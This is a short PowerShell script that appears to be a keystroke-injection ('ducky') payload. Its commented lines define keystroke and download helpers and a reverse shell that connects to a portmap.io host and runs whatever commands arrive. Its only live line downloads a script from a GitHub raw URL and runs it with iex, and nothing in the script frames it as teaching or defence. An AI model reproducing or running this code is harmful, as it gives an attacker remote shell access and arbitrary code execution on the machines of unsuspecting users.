#[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::Tls12
#function k([string]$a){(new-object -comobject wscript.shell).sendkeys($a)}
#function ds([string]$a){(new-object net.webclient).downloadstring($a)}
#function df([string]$a,[string]$b){invoke-webrequest $a -outfile $b}
#function signature{notepad;sleep 1;iex (ds https://raw.githubusercontent.com/computer-geek64/ducky/master/powershell_signatures/kali_powershell)}
#while($true){$sm=(New-Object Net.Sockets.TCPClient("computergeek64-32243.portmap.io",32243)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes(("$(iex $d)`n$(pwd)> " 2>&1));$sm.Write($st,0,$st.Length)};sleep 15}
#1..300 | % {(new-object -comobject wscript.shell).sendkeys('{ESC}'); sleep -milliseconds 200}
iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/kali_powershell_signature).content
